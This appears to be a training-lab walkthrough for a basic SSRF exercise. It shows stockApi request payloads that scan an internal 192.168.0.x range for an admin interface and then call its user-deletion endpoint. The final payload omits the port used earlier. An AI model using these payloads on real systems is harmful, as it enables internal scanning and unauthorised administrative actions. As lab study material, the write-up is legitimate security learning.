
# SSRF Lab-02

## Basic SSRF against another back-end system

### Problem

- This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an `admin` interface on port `8080`, then use it to delete the user `carlos`.

### Solution

- Connect To burp suite. After that you can go to any images and Click the View details and check the stock.

- After connect with burp, send the stockcheck Request to repeter.

- In Repeter Change the request `stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1` To this `stockApi=http://192.168.0.1:8080/admin` & This request sent to intruder(Burp).

- In Intruder use the Sniper attack `stockApi=http://192.168.0.$1$:8080/admin` and  in payload position Give the ip numers 1 to 255. After completed  we can search for 200 responce and see the ip `192.168.0.56` . And sent to repeter.

- After Find the path you can delete the Carlos user `stockApi=http://192.168.0.56/admin/delete?username=carlos`

- Lab solved !!!



